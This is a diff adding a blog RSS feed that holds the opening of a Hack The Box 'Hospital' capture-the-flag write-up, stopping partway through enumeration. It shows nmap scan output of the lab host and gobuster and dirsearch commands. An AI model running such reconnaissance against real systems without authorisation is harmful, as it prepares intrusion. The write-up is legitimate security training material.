@@ -1,0 +1,694 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Windows on ShaanksFR Blog</title><link>https://shaanksm.github.io/categories/windows/</link><description>Recent content in Windows on ShaanksFR Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 08 Feb 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://shaanksm.github.io/categories/windows/index.xml" rel="self" type="application/rss+xml"/><item><title>Hospital Writeup</title><link>https://shaanksm.github.io/p/hospital-writeup/</link><pubDate>Thu, 08 Feb 2024 00:00:00 +0000</pubDate><guid>https://shaanksm.github.io/p/hospital-writeup/</guid><description>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hospital.png" alt="Featured image of post Hospital Writeup" />&lt;h1 id="hospital-htb---writeup">HOSPITAL HTB - WRITEUP&lt;/h1>
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>Welcome to &amp;ldquo;Hospital&amp;rdquo; on Hack The Box, an immersive cybersecurity challenge designed to test your prowess across both Linux and Windows environments. Within this simulated hospital setting, you&amp;rsquo;ll encounter a diverse array of vulnerabilities, ranging from upload RCE exploits to intricate password hash cracking techniques. Our mission ? Is to navigate through this challenge, leveraging ours skills to strengthen the hospital&amp;rsquo;s security posture.
+By delving into the intricacies of both operating systems, we&amp;rsquo;ll gain invaluable experience in penetration testing and vulnerability assessment. Together, let&amp;rsquo;s embark on this journey to fortify Hospital against cyber threats and ensure the safety of its digital infrastructure. Are you ready to rise to the challenge? Let&amp;rsquo;s begin our quest for enhanced security.&lt;/p>
+&lt;h2 id="matrix">Matrix&lt;/h2>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/matrix.png"
+width="341"
+height="302"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/matrix_hube9c41c08d3318888d156519cd1f451e_31505_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/matrix_hube9c41c08d3318888d156519cd1f451e_31505_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Matrix&amp;rsquo;s Machine"
+class="gallery-image"
+data-flex-grow="112"
+data-flex-basis="270px"
+>&lt;/p>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;p>I kick off the process by enumerating ports using AutoRecon(Tool only for CTF environnemnt, too noisy in real pentest imo&amp;rsquo;) and it appear that we&amp;rsquo;ve an AD ? I&amp;rsquo;m left my dog Bloody outsite ..&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Nmap 7.94SVN scan initiated Sat Jan 20 17:49:14 2024 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/shnks/HTB/Hospital/results/hospital.htb/scans/_quick_tcp_nmap.txt -oX /home/shnks/HTB/Hospital/results/hospital.htb/scans/xml/_quick_tcp_nmap.xml hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report for hospital.htb (10.10.11.241)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up, received user-set (0.026s latency).
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Scanned at 2024-01-20 17:49:15 CET for 291s
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: 980 filtered tcp ports (no-response)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEOWkMB0YsRlK8hP9kX0zXBlQ6XzkYCcTXABmN/HBNeupDztdxbCEjbAULKam7TMUf0410Sid7Kw9ofShv0gdQM=
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGH/I0Ybp33ljRcWU66wO+gP/WSw8P6qamet4bjvS10R
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain syn-ack Simple DNS Plus
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-01-20 23:49:32Z)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc syn-ack Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2028-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">443/tcp open ssl/http syn-ack Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ssl-date: TLS randomness does not represent time
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| http-methods:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=localhost
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=localhost
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 1024
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha1WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2009-11-10T23:48:47
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2019-11-08T23:48:47
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| tls-alpn:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ http/1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open ldapssl? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2028-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1801/tcp open msmq? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2103/tcp open msrpc syn-ack Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2105/tcp open msrpc syn-ack Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2107/tcp open msrpc syn-ack Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2179/tcp open vmrdp? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2028-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open globalcatLDAPssl? syn-ack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2028-09-06T10:49:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 04b1:adfe:746a:788e:36c0:802a:bdf3:3119
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server syn-ack Microsoft Terminal Services
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: commonName=DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Issuer: commonName=DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Public Key bits: 2048
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Signature Algorithm: sha256WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-09-05T18:39:34
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid after: 2024-03-06T18:39:34
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MD5: 0c8a:ebc2:3231:590c:2351:ebbf:4e1d:1dbc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| SHA-1: af10:4fad:1b02:073a:e026:eef4:8917:734b:f8e3:86a7
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| MIIC4jCCAcqgAwIBAgIQJ8MSkg5FM7tDDww5/eWcbjANBgkqhkiG9w0BAQsFADAa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| [..blablabla.]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| zXOe5MnTuI+omoq6zEeUs5It4jL1Yg==
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| rdp-ntlm-info:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Target_Name: HOSPITAL
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| NetBIOS_Domain_Name: HOSPITAL
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| NetBIOS_Computer_Name: DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| DNS_Domain_Name: hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| DNS_Computer_Name: DC.hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| DNS_Tree_Name: hospital.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Product_Version: 10.0.17763
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ System_Time: 2024-01-20T23:53:25+00:00
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8080/tcp open http syn-ack Apache httpd 2.4.55 ((Ubuntu))
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-open-proxy: Proxy might be redirecting requests
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-server-header: Apache/2.4.55 (Ubuntu)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| http-methods:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| http-title: Login
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_Requested resource was login.php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| http-cookie-flags:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| /:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| PHPSESSID:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ httponly flag not set
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Hosts: DC, www.example.com; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Meanwhile I did gobuster to enumerate, and I seen 3 other subdomain&lt;/p>
+&lt;p>&lt;code>gobuster dns -d hospital.htb -r hospital.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image.png"
+width="1234"
+height="527"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image_hu2e4310c3ecd6ca1f8d9be258a54346c9_84955_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image_hu2e4310c3ecd6ca1f8d9be258a54346c9_84955_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="234"
+data-flex-basis="561px"
+>&lt;/p>
+&lt;p>We also run a path enumeration with dirsearch to find our first entry point. Other port enumerations yielded no fruitful results, no users for ASREPRoastable enumeration, LDAP enumeration impossible (both null and anonymous sessions), no transfers on port 53, and IPv6 address can be disregarded.&lt;/p>
+&lt;p>&lt;code>dirsearch -u http://dc.hospital.htb:8080 --exclude-status 400,401,402,403,404,500,501,502,503,504&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-2.png"
+width="952"
+height="631"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-2_hu97f203f4532b51abbcb223fe0dee8f78_153251_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-2_hu97f203f4532b51abbcb223fe0dee8f78_153251_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="150"
+data-flex-basis="362px"
+>&lt;/p>
+&lt;p>Port 443 is open, but after multiple attempts to bypass authentication, reading code, we&amp;rsquo;ll leave it for later. It may prove useful in the future.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-8.png"
+width="1819"
+height="605"
